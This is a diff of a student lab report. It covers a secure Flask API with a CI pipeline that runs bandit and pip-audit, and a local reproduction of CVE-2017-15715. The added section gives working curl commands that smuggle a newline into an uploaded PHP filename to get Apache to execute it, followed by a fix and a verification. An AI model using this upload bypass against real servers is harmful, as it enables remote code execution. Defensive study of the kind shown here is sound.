@@ -1,8 +1,11 @@
-# Secure REST API with CI/CD & CVE Vulnerability Analysis
+# Work 1: Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis
 
 **Student Name:** Yu Zhenlei (俞振磊)
-**Student ID:** 23320217
+**Student ID (HDU number):** 23320217
 **Class:** 23320112
+
+**Repository:** https://github.com/Yewleaves/secure-api-lab
+**Last successful pipeline run:** https://github.com/Yewleaves/secure-api-lab/actions/workflows/ci.yml
 
 ## 1. Project & API Description
 This project is a secure REST API built with Python and the Flask framework, using SQLite for data storage. It implements the following three endpoints:
@@ -33,8 +36,12 @@ A GitHub Actions pipeline (`.github/workflows/ci.yml`) is configured. On every c
 - **SAST (Static Application Security Testing)**: Uses `bandit` to scan the source code for security flaws.
 - **SCA (Software Composition Analysis)**: Uses `pip-audit` to check for known CVE vulnerabilities in dependencies.
 
+`bandit` runs with `-ll -iii`, i.e. it reports only medium-or-higher severity findings that it is highly confident about.
+`pip-audit` is the Python-native SCA scanner: it resolves `requirements.txt` and checks every pinned package against the PyPI/OSV advisory database, and it is invoked with `--strict` so that any known vulnerable dependency fails the build.
+
 ### GitHub Actions Screenshot
 <img width="1581" height="1518" alt="7github2" src="https://github.com/user-attachments/assets/65ba306e-3d11-4e72-8ebc-08b4c00dafc5" />
+
 
 
 ---
@@ -45,7 +52,30 @@ A GitHub Actions pipeline (`.github/workflows/ci.yml`) is configured. On every c
 **Description:** This vulnerability allows attackers to bypass file upload restrictions. By appending a newline character (`\x0A`) to a filename (e.g., `shell.php\n`), the uploader's blacklist check is bypassed, but Apache still parses and executes the file as a PHP script, leading to Remote Code Execution (RCE).
 
 ### Steps to Reproduce
-After starting the vulnerable environment, the attacker uploads a PHP script with a newline character injected into the filename.
+The vulnerable environment is the official Vulhub one (`vulhub/httpd/CVE-2017-15715`), which runs a PHP 5.5 + Apache 2.4.x stack inside the affected version range, in front of a small file-upload page.
+
+```bash
+git clone https://github.com/vulhub/vulhub.git
+cd vulhub/httpd/CVE-2017-15715
+docker compose up -d          # Apache is published on http://127.0.0.1:8080
+```
+
+First confirm that the blacklist blocks a normal PHP upload:
+
+```bash
+printf '<?php echo "pwned"; ?>' > shell.php
+curl -i -F "file=@shell.php" -F "name=1.php" http://127.0.0.1:8080/
+# -> HTTP 200, body: bad file
+```
+
+Now append a single `\x0A` to the filename (`$'...'` lets bash expand `\x0a`). The extension extracted by `pathinfo()` becomes `php\n`, which is not in the blacklist, so the file is written to disk:
+
+```bash
+curl -i -F "file=@shell.php" -F $'name=1.php\x0a' http://127.0.0.1:8080/
+# -> HTTP 200, the file is accepted
+curl -i "http://127.0.0.1:8080/1.php%0a"
+# -> HTTP 200 + "pwned": Apache executed the uploaded script
+```
 
 <img width="969" height="291" alt="1漏洞复现2" src="https://github.com/user-attachments/assets/61556fd2-8cff-480a-b4a3-b8c3b25ec2d8" />
 
@@ -54,7 +84,29 @@ After starting the vulnerable environment, the attacker uploads a PHP script wit
 The vulnerability lies in how PHP's `pathinfo()` function and Apache's `<FilesMatch \.php$>` directive handle newline characters. When a filename like `shell.php\n` is uploaded, `pathinfo()` extracts the extension as `php\n`, which bypasses the blacklist (which only checks for `php`). However, Apache's regex `$` anchor matches the newline character, causing Apache to execute the file as PHP. This is a classic case of **improper input validation**.
 
 ### Fix and Verification
-- **Fix Applied**: I modified the `index.php` source code to explicitly block filenames containing newline characters using a regular expression: `if (preg_match('/[\r\n]/', $name)) { exit('bad file'); }`. (The fixed `index.php` and `docker-compose.yml` files are located in the `cve-fix/` directory).
-- **Verification**: After applying the fix and restarting the environment, the exact same exploit payload was sent again. The server successfully blocked the upload and the script returned `[SECURE] Exploit failed` (404 Not Found), proving the vulnerability is remediated while normal functionality remains intact.
+- **Fix Applied**: I modified the `index.php` source code to explicitly block filenames containing newline characters using a regular expression: `if (preg_match('/[\r\n]/', $name)) { exit('bad file'); }`. (The fixed `index.php` and `docker-compose.yml` files are located in the `cve-fix/` directory.)
+- **Environment**: `cve-fix/Dockerfile` deliberately reuses the same vulnerable base image (`vulhub/php:5.5-apache`, PHP 5.5 + Apache 2.4.x in the vulnerable range) and only replaces `index.php`. Keeping the image identical isolates the code change, so the result cannot be explained by an Apache upgrade.
+
+```bash
+cd cve-fix
+docker compose up --build -d
+```
+
+- **Verification**: After applying the fix and restarting the environment, the exact same exploit payload was sent again. The server rejected the upload, returned `bad file` with HTTP 200, and the file was never written to disk — therefore requesting it yields `404 Not Found`. Normal uploads still work:
+
+```bash
+# exploit payload again
+curl -i -F "file=@shell.php" -F $'name=1.php\x0a' http://127.0.0.1:8080/
+# -> HTTP 200, body: bad file
+curl -i "http://127.0.0.1:8080/1.php%0a"
+# -> HTTP 404, the script does not exist
+
+# regression test: a legitimate upload still succeeds
+curl -i -F "file=@shell.php" -F "name=note.txt" http://127.0.0.1:8080/
+curl -i "http://127.0.0.1:8080/note.txt"
+# -> HTTP 200, content is served normally
+```
+
+This proves the vulnerability is remediated while normal functionality remains intact.
 
 <img width="1079" height="351" alt="2 修复成功2" src="https://github.com/user-attachments/assets/70321143-7629-4805-9293-5ea1075c3412" />
